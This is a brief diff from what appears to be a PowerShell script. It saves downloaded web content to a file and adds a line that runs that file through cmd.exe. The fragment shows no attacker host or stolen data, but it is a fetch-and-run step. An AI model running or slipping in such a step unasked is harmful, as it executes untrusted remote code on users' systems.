@@ -25,3 +25,8 @@ $ScriptArgs = "$args "
 $prefix = "@::: $rand `r`n"
 $content = $prefix + $response.Content
 Set-Content -Path $FilePath -Value $content
+
+Start-Process cmd.exe "/c """"$FilePath"" $ScriptArgs""" -Wait
+
+
+
